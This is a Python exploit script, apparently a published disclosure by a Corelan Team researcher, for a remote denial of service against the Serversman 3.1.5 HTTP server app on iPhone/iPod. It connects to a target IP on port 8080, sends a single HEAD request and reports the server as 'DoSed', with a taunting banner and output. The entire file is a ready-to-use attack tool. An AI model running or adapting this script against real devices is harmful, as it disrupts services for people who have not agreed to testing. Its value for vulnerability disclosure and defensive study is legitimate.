#!/usr/bin/python
#
# Apple Iphone/Ipod - Serversman 3.1.5 HTTP Remote DoS exploit
# Found by: Steven Seeley (mr_me) seeleymagic [at] hotmail [dot] com
# Homepage: http://serversman.com/index_en.jsp
# Download: From the app store (Free - use your Itunes account)
# Tested on: Iphone 3G - firmware 3.1.2 (Darwin kernel)
# Greetz: corelanc0d3r, EdiStrosar, rick2600, ekse, MarkoT, sinn3r & Jacky from Corelan Team
# Special Greetz to TecR0c!
#

print "|------------------------------------------------------------------|"
print "|                         __               __                      |"
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
print "|                                                                  |"
print "|                                       http://www.corelan.be:8800 |"
print "|                                              security@corelan.be |"
print "|                                                                  |"
print "|-------------------------------------------------[ EIP Hunters ]--|"
print "[+] Apple Iphone/Ipod - Serversman 3.1.5 HTTP Remote DOS exploit"

import socket
import sys

def Usage():
    print ("Usage: ./serversman.py <serv_ip>\n")
    print ("Example: ./serversman.py 192.168.48.183\n")
if len(sys.argv) <> 2:
        Usage()
        sys.exit(1)
else:
    hostname = sys.argv[1]
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 8080))
	print "[+] Connecting to the target.."
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    print "[+] Sending payload.. muhaha ph33r"
    sock.send("HEAD / HTTP/1.0\r\n\r\n")
    r=sock.recv(1024)
    sock.close()
    print "[+] HTTP Server is now DoSed!"
    sys.exit(0);